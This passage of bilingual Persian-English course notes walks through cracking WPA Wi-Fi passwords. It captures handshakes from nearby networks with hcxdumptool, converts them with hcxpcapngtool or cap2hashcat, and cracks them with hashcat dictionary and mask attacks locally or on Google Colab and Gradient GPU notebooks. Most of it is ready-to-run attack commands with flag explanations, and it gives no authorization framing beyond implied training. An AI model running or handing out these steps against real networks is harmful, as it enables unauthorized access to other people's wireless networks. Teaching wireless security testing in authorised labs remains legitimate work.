		1. ![[Pasted image 20240706194717.png]]
2. *Scan for available networks*(Radio Chanell Analyze)
	1. new version syntax `sudo hcxdumptool -i wlan0 --rcascan=p`
	2. `sudo hcxdumptool -i wlan0 --do_rcascan`
		1. ![[Pasted image 20240706194841.png]]
3. *Capture traffics with `Hcxdumptool`*
	1. new version syntax `sudo hcxdumptool -i wlan0 -w dumpfile.pcapng --essidlist=essid`
		1. `-w dumpfile.pcapng` => Handshake Captured store in this file
		2. `--essidlist=./essidlist` => Specify Essid List file name
		3. `tot=3` Timeout Timer in Minutes *Optional*
	2. old version syntax `sudo hcxdumptool -i wlan0 -o dumpfile.pcapng -active_beacon -enable_status=15`
		1. ![[Pasted image 20240706195205.png]]
	3. `-o dumpfile.pcapng` => Handshake Captured store in this file
	4. `-i wlan0` => Interface for Capturing
	5. Wait(5 to 10 Minutes) until `Hcxdumptool` Captured Handshakes in nearby
4. After a minute or two, Stop Capturing with `CTRL+C` and you can see Captured Handshake in `/home/kali` Directory
	1. ![[Pasted image 20240706195701.png]]
#### Practical Demo
0. نصب ابزار `Hcxdumptool`
	1. `sudo apt-get update && sudo apt-get install hcxdumptool`
1. *آماده سازی کارت شبکه وایرلسی*
	1. بررسی کارت شبکه  `iwconfig`
	2. متوقف کردن پروسه هایی که از کارت شبکه استفاده میکنند.
		1. `sudo systemctl stop NetworkManager` Stop Network Process
		2. `sudo systemctl stop wpa_supplicant` Stop WPA Handshake Process
		3. بعد از اتمام اسکن و کپچر کردن Handshake با استفاده از کامند زیر پروسه Network Manager را دوباره راه اندازی میکنیم.
		4. `sudo systemctl start NetworkManager`
2. *اسکن تمام شبکه های اطراف*
	1. `sudo hcxdumptool -i wlan0 --rcascan`
	2. `sudo hcxdumptool -i wlan0 --do_rcascan`
		1. ![[Pasted image 20240706200616.png]]
	3. پس از یک یا دو دقیقه، اسکن را با `CTRL+C` متوقف میکنیم تا به Capturing بپردازیم.
3. *کپچر کردن Handshake های SSID های اطراف*
	1. `sudo hcxdumptool -i wlan0 -w dumpfile.pcapng --essidlist=essidlist`
	2. `sudo hcxdumptool -i wlan0 -o dumpfile.pcapng -active_beacon -enable_status=15`
		1. ![[Pasted image 20240706201024.png]]
	3. بگذارید اسکن به مدت دو یا سه دقیقه انجام شود، پس از آن اسکن را با `CTRL+C` متوقف میکنیم.
4. مشاهده Handshake کپچر شده
	1. فایل Handshake های کپچر شده در دایرکتوری `home/kali/` قرار دارد و `dumpfile.pcapng` نیز نام فایل است :
		1. ![[Pasted image 20240706201230.png]]
------
```sh
sudo apt-get update && sudo apt-get install hcxdumptool -y

sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

sudo hcxdumptool -i wlan0 --rcascan -w newscanhcx.pcapng #new versions
sudo hcxdumptool -i wlan0 --do_rcascan #old versions
#CTRL+C Stop Scan

sudo hcxdumptool -i wlan0 -w dumpfile.pcapng --essidlist=essidlist #new versions
sudo hcxdumptool -i wlan0 -o dumpfile.pcapng -active_beacon -enable_status=15 #old versions
```
### 2. Preparing Captured Handshakes for Hashcat - E40
#### Definition & Instruction
##### Basic & Concepts
در قدم دوم باید فایل Handshake های Capture شده را به فرمتی تبدیل کنیم که بتوانیم آنرا توسط hashcat کرک کنیم، در واقع در این جلسه میخواهیم فایل Handshake را برای ابزار Hashcat به دو روش  آماده کنیم. 
- در جلسات قبلی از دو ابزار `Aircrack-ng` و `Hcxdumptool` برای Capturing Handshake استفاده کردیم. حال باید این فایل Capture شده را به نحوی برای کرک توسط Hashcat آماده کرد. در واقع فایل Capture شده را از فرمت `pcapng.` بوسیله ابزاری بنام `hcxpcapngtool` به فرمت `hc22000.` تغییر دهیم تا Hashcat بتواند آنرا کرک کند.
##### Hashcat Vs Aircrack
- ابزار *Hashcat* ابزاری جدید است که میتواند از قدرت `GPU` برای کرک تقریبا تمام انواع هش(200  مدل) استفاده کند. 
- ابزار *Hashcat* از انواع حملات مانند `Dictionary Attack` و `Brute Force` نیز پشتیبانی میکند.
- ابزار *Hashcat* توانایی کرک بیش از 200 مدل Hash Type را دارد. 
- درحالیکه ابزار *Aircrack-ng* فقط میتواند حمله `Dictionary Attack` را برای کرک مقدار هش درون Handshake پیاده سازی کند.
##### Converter Tool's 
###### What is `hcxpcapngtool` ?
از این ابزار برای Convert فایل های کپچر شده با فرمت `pcapng.`  به فایل که Hashcat بتواند آنرا بخواند با فرمت `hc22000.` استفاده میکنیم. در واقع Convertor فایل های `pcapng.` به `hc22000.` میباشد.
این ابزار درون مجموعه `hcxtools` قرار دارد و برای استفاده باید در ماشین Kali نصب شود.
```sh
sudo apt update 
sudo apt install hcxtools -y
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
-o => Specify Output file '.hc22000'
-E => List will contains SSID,s
'dumpfile.pacpng' => Captured file contains Handshake
```
###### What is `cap2hashcat` 
یکی دیگر از ابزار هایی که برای Convert فایل کپچر شده با پسوند `cap.` را به فایل `hc22000.` تبدیل کنیم استفاده از ابزاری است که توسعه دهندگان Hashcat ارائه کرده اند. این ابزار در آدرس زیر میتوانیم بیابیم:
- https://hashcat.net/cap2hashcat/
این ابزار سرویس آنلاین است، در واقع باید فایل `cap.` را در وبسایت آپلود کنیم، سپس وبسایت آنرا برای ما تبدیل میکند و میتوانیم فایل `hc22000.` را دانلود کنیم:
	![[Pasted image 20240707195354.png]]

##### Instruction Steps
###### Convert Handshakes Captured with `hcxdumptool` by `hcxpcapngtool` - Phase *1*
- تبدیل فایل های `pcapng.` به `hc22000.`
1. *پیش نیاز ها* 
	1. بالا آوردن ماشین کالی
	2. آپدیت ریپوزیتوری و نصب `hcxtools`
		1. `sudo apt update && sudo apt install hcxtools -y`
			1. ![[Pasted image 20240707192424.png]]
2. *تبدیل فایل `dumpfile.pcapng` به `hash.hc22000` بوسیله `hcxpcapngtool`*
	1. `hcxpcapngtool -o hash.hc22000 -E ssidlist dumpfile.pcapng`
		1. ![[Pasted image 20240707193403.png]]
	2. *Slide*
		1. ![[Pasted image 20240707193319.png]]
3. *بررسی Essid List برای بررسی Wifi Network Names*
	1. حال فایل `essidlist` را باز میکنیم تا نام شبکه های وایرلسی را بررسی کنیم. گاهی اوقات ممکن است SSID پسوردی لو رفته Leaked شده داشته باشد که در این مواقع بدون کرک کردن و با بررسی لیست `essidlist`  میتوانیم پسورد آن SSID را بدست بیاوریم.
		1. ![[Pasted image 20240707193806.png]]
	2. `nano essidlist`
		1. ![[Pasted image 20240707193802.png]]
4. *بدست آوردن Mac Addr(BSSID) شبکه وایرلس تارگت بوسیله `hcxdumptool`*
	1. حال با اسکن شبکه های وایرلسی با ابزار `hcxdumptool` مک آدرس شبکه وایرلسی تارگت را بدست میاوریم و آن مقدار را در مکانی کپی کنیم.
	2. `hcxdumptool -i wlan0 --do_rcascan`
		1. ![[Pasted image 20240707194026.png]]
5. *پاک کردن اطلاعات اضافی از `hash.hc22000` به غیر از Handshake های کپچر شده*
	1. حال کافیست فایل hash.hc22000 را در ادیتوری باز کنیم و متن های اضافه به غیر از Handshake ها را پاک کنیم. 
		1. ![[Pasted image 20240707194259.png]]
	2. `nano hash.hc22000`
6. *انتقال فایل های `hash.hc22000` و  `essidlist` به ماشین ویندوزی*
	1. حال کافیست این دو فایل را از ماشین Kali در VMWare به ماشین ویندوزی مان انتقال دهیم تا بتوانیم با استفاده از تمام قدرت GPU عملیات کرک را انجام دهیم.
		1. ![[Pasted image 20240707194605.png]]
******
```sh
sudo apt update && sudo apt install hcxtools -y

hcxpcapngtool -o hash.hc22000 -E ssidlist dumpfile.pcapng
nano essidlist #Check ESSID List 

hcxdumptool -i wlan0 --rcascan
nano hash.hc22000

```
###### Convert Handshakes Captured with `Aircrack Suite` by `cap2hashcat` - Phase *2*
- تبدیل فایل های `cap.` به `hc22000.`
	در این روش میخواهیم با استفاده از `cap2hashcat`  فایل کپچر شده با پسوند `cap.` را به فایل `hc22000.` تبدیل کنیم.
1. انتقال فایل `pass.cap` از ماشین کالی به ویندوز
	1. ![[Pasted image 20240707194942.png]]
2. *سپس به وبسایت زیر برای تبدیل فایل میرویم*:
		1. https://hashcat.net/cap2hashcat/
			1. ![[Pasted image 20240707195040.png]]
	2. فایل `pass.cap` را آپلود میکنیم تا بتوانیم فایل تبدیل شده را در فرمت `hc22000.` دانلود کنیم:
		1. ![[Pasted image 20240707195535.png]]
3. فایل `pass.cap` با موفقیت به `pass.hc22000` تبدیل شد.
#### Practical Demo
###### Convert Handshakes Captured with `hcxdumptool` by `hcxpcapngtool` - Phase *1*
0. *Pre-Requires*
	1. Update kali repositories and install `hcxtools`
		1. `sudo apt update && sudo apt install hcxtools -y`
1. *Converting `dumpfile.pcapng` to  `hash.hc22000` with `hcxpcapngtool`*
	1. `hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng`
		1. ![[Pasted image 20240707200143.png]]
	2. Now we can Use ESSID List in `/home/kali` directory
		1. ![[Pasted image 20240707200208.png]]
	3. `cd ~ && nano essidlist`
		1. ![[Pasted image 20240707200333.png]]
2. *Obtain Mac Address of Target SSID with `hcxdumptool`*
	1. `hcxdumptool  -i wlan0 --do_rcascan`
		1. ![[Pasted image 20240707200628.png]]
	2. Now in scan list copy mac addr of target ssid
		1. ![[Pasted image 20240707200646.png]]
3. *Open `hash.hc22000` and remove unnecessary contents*
	1. File Contents Before Removing
		1. ![[Pasted image 20240707200822.png]]
	2. File Contents After Removing
		1. ![[Pasted image 20240707200926.png]]
	3. Save file and exit editor
4. Now Move/Copy `hash.hc22000` from Kali to Windows to Cracking this with Hashcat with full power of GPU
	1. ![[Pasted image 20240707201125.png]]
*****
```sh
sudo apt update && sudo apt install hcxtools -y
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
cd ~ && nano essidlist

hcxdumptool -i wlan0 --rcascan==a
```
###### Convert Handshakes Captured with `Aircrack Suite` by `cap2hashcat` - Phase *2*
0. Copy `.cap` file from Kali to Windows *Optional*
1. Search in google for `cap2hashcat` or goto https://hashcat.net/cap2hashcat/
2. Click on `choose file` and Upload `pass.cap`
	1. ![[Pasted image 20240707201744.png]]
3. Finally Click on `Convert` to start converting
	1. ![[Pasted image 20240707201826.png]]
4. Now we can download `.hc22000` file
	1. ![[Pasted image 20240707201906.png]]
### 3. Cracking Handshakes with `hashcat` -E41
#### Definition & Instruction
##### Definition's 
حال که فایل Capturing Handshake را به فرمت `hc22000.` تبدیل کردیم، در قدم سوم باید بوسیله `Hashcat` آنرا کرک کنیم. در این جلسه میخواهیم به کرک فایل های `hc22000.` بپردازیم.
در واقع در جلسه قبلی سعی کردیم فایل های `cap.` و `pcapng.` را به فایل `hc22000.` تبدیل کنیم تا بتوانیم آنرا در این جلسه بوسیله Hashcat کرک کنیم.
	![[Pasted image 20240708151802.png]]
کارکردن با ابزار Hashcat نیازمند کارت گرافیک قوی به همراه تمام درایور های مورد نیاز آن است. حال ماشینی که hashcat را میخواهیم در آن راه بیاندازیم و استفاده کنیم میتواند در Kali, Windows و یا حتی در Cloud باشد که در جلسات بعدی توضیح میدهیم.
	![[Pasted image 20240708152126.png]]
##### Cracking in the Cloud
سرویس های `Google`, `Azure` و `Linode` سرویس های پردازش ابری Cloud هستند که VPS های خود را به همراه GPU عرضه میکنند.
روش دیگر اجرای Hashcat در Cloud، اجرای آن در دفاتر `Jupyter-Based Notebook` میباشد که این روش بیشترین استفاده را در راه اندازی LLM ها را دارد. سرویس هایی که مجهز به این تکنولوژی هستند >>
1. *Google Collab*
2. *Gradient*
3. Slide
	1. ![[Pasted image 20240708152736.png]]
> بنابراین بهترین و پرسرعت ترین روش استفاده از Hashcat در سرویس های Cloud و بر روی دفاتر Jupyter-Based Notebooks است.
##### Cloud Services
###### Google Collab
- یکی از سرویس های رایگان پردازش ابری که توسط متخصصان گوگل برای تست مدل های LM عرضه شده است Google Collab نام دارد.
- تعدادی Jupyter Notebook آماده وجود دارند که میتوانیم با استفاده از آنها به کرک مقادیر هش شده بپردایم.
- اگر که از این سرویس برای مقاصد مخرب استفاده کنید، گوگل دسترسی شما را به این سرویس محدود میکند.
- *اسلاید*:
	- ![[Pasted image 20240708153949.png]]

###### Gradient
یکی دیگر از سرویس های پردازش ابری سرویس Gradient میباشد که توسط Digital Ocean عرضه شده است. برای استفاده از این سرویس ابتدا باید در لینک زیر Register کنیم.
- https://gradient.run/
	- ![[Pasted image 20240708155455.png]]
آدرس این سرویس جدید عوض ده است و همچنین Gradient دیگر سرویس رایگان هم عرضه نمیکند.
- https://www.paperspace.com/gradient/enterprise
###### Pre-Built Labs in Google Collab for Cracking
- *Laboratory in Collab for Cracking*:
	1. https://colab.research.google.com/github/mxrch/penglab/blob/master/penglab.ipynb 
	2. https://colab.research.google.com/github/someshkar/colabcat/blob/master/colabcat.ipynb
	3. https://colab.research.google.com/github/ShutdownRepo/google-colab-hashcat/blob/main/google_colab_hashcat.ipynb
- *Slide*:
	1. ![[Pasted image 20240708154203.png]]
##### Instruction Steps
###### Cracking Handshakes in *Windows* Instruction 
0. *پیش نیاز ها*:
	1. دانلود Hashcat Binary 32/64 مخصوص ویندوز از وبسایت رسمی
		1. ![[Pasted image 20240708153002.png]]
	2. کپی فایل `hash.hc22000` به پوشه Hashcat
		1. ![[Pasted image 20240708153103.png]]
	3. دانلود Rockyou یا Wordlist دیگر، سپس انتقال آن به پوشه Hashcat
		1. ![[Pasted image 20240708153140.png]]
1. *کرک فایل `hash.hc22000` در Dictionary Attack*:
	0. حال Powershell را در پوشه Hashcat باز میکنیم و با استفاده از  کامند زیر به کرک فایل میپردازیم:
	1. `.\Hashcat.exe -m 22000 -a 0 -o cracked.txt hash.hc22000 rockyou.txt`
		1. `-m 22000` Tell hashcat is Wifi Password
		2. `-a 0` Attack Mode is Dictionary Attack
		3. `-o cracked.txt` Output Cracked hash store in this file
		4. *Slide*:
			1. ![[Pasted image 20240708153605.png]]
2. *کرک فایل `hash.hc22000` در Brute Force with Mask Attack*:
	1. `.\hashcat.exe -m 22000 -a 3 ?d?d?l?l hash.hc22000 -o cracked.txt`
3. فایل `hash.hc22000` با موفقیت کرک شد.
----
```sh
#Cracking in Dictionary Attack
.\Hashcat.exe -m 22000 -a 0 -o cracked.txt hash.hc22000 rockyou.txt
#Cracking in Brute force with mask Attack
.\hashcat.exe -m 22000 -a 3 ?d?d?l?l?u hash.hc22000 -o cracked.txt
```
###### Cracking Handshakes in Cloud with *Google Collab* Instruction 
0. *پیش نیاز ها*
	1. ابتدا در Google Collab ثبت نام میکنیم و سپس بر روی یکی از لینک های زیر کلیک میکنیم تا داخل آزمایشگاه آماده برای Hashcat Cracking شویم:
		1. ![[Pasted image 20240708154203.png]]
	2. لینک های آزمایشگاه های Pre-Built >> 
		1. https://colab.research.google.com/github/mxrch/penglab/blob/master/penglab.ipynb 
		2. https://colab.research.google.com/github/someshkar/colabcat/blob/master/colabcat.ipynb
		3. https://colab.research.google.com/github/ShutdownRepo/google-colab-hashcat/blob/main/google/colab/hashcat.ipynb
		4. *Image*:
			1. ![[Pasted image 20240708154214.png]]
	3. همچنین در Collab مقدار Runtime را از CPU به GPU تغییر میدهیم.
		1. `Collab => Runtime => Change Runtime type` Set on GPU
1. *آماده سازی Jupyter Notebook*
	1. ابتدا با اجرای Code Block Section 1 ابزار Hashcat و Dictionary ها را بر روی Collab نصب میکنیم.
	2. سپس فایل `hash.hc22000` را در یک سرویس آپلود فایل Host Providers مانند https://filebin.com و یا https://catbox.moe آپلود میکنیم تا بتوانیم آنرا در Jupyter Notebook خود Import کنیم. 
	3. پس از آپلود فایل، لینک فایل را کپی میکنیم و برای وارد کردن فایل در Jupyter Notebook از کامند `wget` استفاده میکنیم:
		1. ![[Pasted image 20240708154904.png]]
	4. در واقع با اجرای Code Block Section 2 فایل `hash.hc22000` آپلود شده را داخل فایل های آزمایشگاه میکنیم.
	5. `wget https://filebin.com/filename`
2. *کرک فایل `hash.hc22000`*
	1. حال که فایل در Jupyter Notebook قرار دارد با استفاده از کامند زیر و در واقع با اجرای Code Block Section 3 میتوانیم آنرا کرک کنیم:
	2. 
	2. `!hashcat --status -m 22000 -a 0 -o cracked.txt hash.hc22000 /content/wordlist/rockyou.txt`
		1. ![[Pasted image 20240708155147.png]]
3. فایل ما با موفقیت کرک شد.
###### Cracking Handshakes in Cloud with *Gradient* Instruction 
0. *پیش نیاز ها*
	1. ابتدا به وبسایت https://gradient.run/ میرویم و Register میکنیم.
	2. لینک سرویس جدیدا به https://www.paperspace.com/gradient/enterprise تغییر کرده است.
	4. سپس کد های مربوط را بلاک به بلک کپی میکنیم و در Notebook جدید میریزیم:
		1. ![[Pasted image 20240708155630.png]]
1. *کرک فایل Handshake*
	1. در ابتدا Code Block Section 1 را تمام از Collab کپی میکنیم و در Gradient پیست میکنیم تا ابزار ها، Wordlist ها و Dependency های مورد نیاز نصب شوند.
	2.  سپس Code Block Section 2 را کپی و در gradient اجرا میکنیم، در واقع فایل `hash.hc22000` را که آپلود کرده بودیم را وارد Jupyter Notebook جدید میکنیم:
	3. `wget https://filebin.com/filename`
	4. سپس Code Block Section 3 را کپی و در gradient اجرا میکنیم، در واقع با استفاده از کامند زیر میتوانیم فایل را کرک کنیم:
	5. `!hashcat --status -m 22000 -a 0 -o cracked.txt hash.hc22000 /content/wordlist/rockyou.txt`
		1. ![[Pasted image 20240708155901.png]]
	6. در واقع کامندی که در *Google Collab* و *Gradient* برای کرک فایل بوسیله hashcat استفاده میشود، یک کامند مشابه هستند.
		1. ![[Pasted image 20240708160042.png]]
2. فایل `hash.hc22000` با موفقیت کرک شد.
#### Practical Demo
##### Cracking Handshakes in *Windows* Instruction
0. *Pre-Requires*
	1. Download Hashcat binaries
		1. ![[Pasted image 20240708160412.png]]
	2. Extract Hashcat folder
		1. ![[Pasted image 20240708160453.png]]
	3. Move `hash.hc22000` to Hashcat folder
		1. ![[Pasted image 20240708160548.png]]
	4. Download `Rockyou.txt` and move it to Hashcat folder
1. Open Powershell in Hashcat folder and run following command to crack `hash.hc22000`
	1. `.\hashcat.exe -m 22000 -a 0 -o cracked.txt hash.hc22000 rockyou.txt`
		1. ![[Pasted image 20240708160932.png]]
	2. After cracking completed, Open `cracked.txt` to see cracking results
		1. ![[Pasted image 20240708161022.png]]
2. Cracking done
*******
```powershell
cd \hashcat\
.\hashcat.exe -m 22000 -a 0 -o cracked.txt hash.hc22000 rockyou.txt
notepad cracked.txt
```
##### Cracking Handshakes in Cloud with *Google Collab* Instruction 
0. *Pre-Requires*
	1. open https://colab.research.google.com and Register in Google Collab
	2. Now open Lab Link 
		1. https://colab.research.google.com/github/ShutdownRepo/google-colab-hashcat/blob/main/google_colab_hashcat.ipynb
			1. ![[Pasted image 20240708162023.png]]
1. *Pre-Pare laboratory*
	1. Now change runtime mode from CPU to GPU
		1. `Jupyter Notebook => Runtime => Change runtime type` 
			1. ![[Pasted image 20240708162152.png]]
		2. Select `GPU` in Hardware Accelerator
			1. ![[Pasted image 20240708162257.png]]
	2. Now Click `Connect` 
		1. ![[Pasted image 20240708162337.png]]
	3. After Connect Run Code Block Section 1
		1. Click on `play` Button in Code Block Section 1 To Installing Hashcat and Dependencies
		2. هنگامیکه بر روی این دکمه کلیک میکنیم Hashcat به همراه تمام Dependency های مورد نیاز آن، همچنین Wordlist Rockyou و در واقع تمام مواردی که برای کرک توسط Hashcat نیاز داریم، در Jupyter Notebook ما نصب میشود.
			1. ![[Pasted image 20240708162453.png]]
2. *Pre-Pare Hash File*
	1. goto https://filebin.com | https://catbox.moe and Upload `hash.hc22000` 
		1. ![[Pasted image 20240708162742.png]]
	2. After Uploading Completed, Copy the file URL.
	3. Now go back to collab page and goto Code Block Section 2:
		1. حال کافیست به صفحه آزمایشگاه بر گردیم و سپس در بلوک دوم کدها، در مقابل کامند `wget` لینک فایل آپلود شده را وارد کنیم:
			1. `wget https://files.catbox.moe/filename`
			2. Image
				1. ![[Pasted image 20240708163103.png]]
	4. Run Code Block Section 2 to Download `hash.hc22000` file in Lab
		1. حال فقط کافیست بلاک دوم کد ها را اجرا کنیم تا فایل مورد نظر ما کرک شود.
			1. ![[Pasted image 20240708163404.png]]
		2. با اجرای کد بلوک دوم، فایل آپلود شده، در آزمایشگاه دانلود میشود و میتوانیم آنرا کرک کنیم.
			1. ![[Pasted image 20240708163442.png]]
3. *Cracking Files*
	1. حال باید در Code Block 3 کامند `hashcat --benchmark!` را پاک کنیم و کامند کرک فایل را جایگزین آن کنیم.  کامند که باید جایگزین شود >>
		1. ![[Pasted image 20240708163851.png]]
	2. دقت کنید نام فایل  `hash.hc22000`پس از آپلود به `v82isy.hc22000` تغییر کرده و بنابراین باید از این نام برای کرک استفاده کنیم.
	3. `!hashcat --status -m 22000 -a 0 -o cracked v82isy.hc22000 wordlists/rockyou.txt`
		1. ![[Pasted image 20240708164132.png]]
	4. حال کافیست Code Block 3 را Run کنیم تا فایل مورد نظر کرک شود.
		1. ![[vlc_xJPze4MkAz.gif]]
4. *Cracking Done. See results*
	1. برای مشاهده نتایج کرک، بر روی `Code +` در بالا صفحه کلیک میکنیم تا بتوانیم کامند جدید تایپ کنیم. سپس ابتدا `ls`  میگیریم و میتوانیم فایل `cracked.txt` را مشاهده کنیم:
		1. ![[Pasted image 20240708164524.png]]
	2. حال کافیست فایل `cracked.txt` را باز کنیم تا پسورد کرک شده را مشاهده کنیم:
	3. `!cat cracked.txt`
		1. ![[Pasted image 20240708164636.png]]
5. After Cracking done Disconnect and Delete Runtime
	1. `Google Collab => Runtime => Disconnect and delete runtime`
		1. ![[Pasted image 20240708164804.png]]
	2. Click on `Yes`
		1. ![[Pasted image 20240708164818.png]]
	3. Operation Finished
##### Cracking Handshakes in Cloud with *Gradient* Instruction
0. *Pre-Requires*
	1. goto https://gradient.run and `Signup for free`
	2. Gradient new Address https://www.paperspace.com/gradient/enterprise
	3. After login, Click on `Create A Machine`
		1. ![[Pasted image 20240709001431.png]]
	4. in Project page, Click on `Create` to Create new Notebook
		1. ![[Pasted image 20240708165149.png]]
	6. Select `Free-GPU` machine for 3/2 Hours
		1. ![[Pasted image 20240708165257.png]]
	7. Click on `Start Notebook` to create notebook
		1. ![[Pasted image 20240708165411.png]]
1. *Pre-Pare Jupyter Notebook*
	1. in Notebook Page, Click on `Open in JupyterLab`
		1. ![[Pasted image 20240708165523.png]]
	2. Select `Notebook > Python 3`
		1. ![[Pasted image 20240708165616.png]]
2. *Now Copy all Codes in Google Collab, Block by Block and then Paste it to Gradient Notebook Block by Block*
	1. حال باید تمام کد هایی که در آزمایشگاه قبلی استفاده کردیم را بلوک به بلوک کپی کنیم و در Jupyter Notebook در Gradient پیست کنیم.
	2. Copy First Code Block and Paste to gradient
		1. ![[Pasted image 20240708165842.png]]
	3. Now Run First Code Block
		1. ![[Pasted image 20240708165918.png]]
3. *Pre-Pare hash file in Lab*
	1. فایل hash را در یک سرویس Host Provider آپلود میکنیم. 
	2. سپس Second Code Block را کپی میکنیم و در Gradient آنرا paste میکنیم.
	3. `!wget https://files.catbox.moe/filename/`
	3. حال کافیست Second Code Block را Run کنیم تا فایل hash در آزمایشگاه دانلود شود. فایل دانلود شده `v82isy.hc22000` نام دارد.
		1. ![[Pasted image 20240708171931.png]]
	4.  فایل دانلود شده را در فایل های آزمایشگاه میتوانیم مشاهده کنیم، بهتر است نام این فایل را به `hash.hc22000` تغییر دهیم.
		1. ![[Pasted image 20240708171949.png]]
4. *Cracking `hash.hc22000` file*
	1. Now we can cracking hash file with this command
	2. `!hashcat -m 22000 -a 0 -o cracked.txt hash.hc22000 wordlists/rockyou.txt`
		1. ![[Pasted image 20240708172151.png]]
	3. حال کافیست این کد بلاک را هم اجرا کنیم تا فایل مورد نظر ما توسط `hashcat` کرک شود.
		1. ![[Pasted image 20240708172255.png]]
5. Cracking Done, See cracking results in `cracked.txt`
	1. حال کافیست فایل `cracked.txt` را باز کنیم تا مقدار کرک شده را مشاهده کنیم:
		1. ![[Pasted image 20240708172351.png]]

### !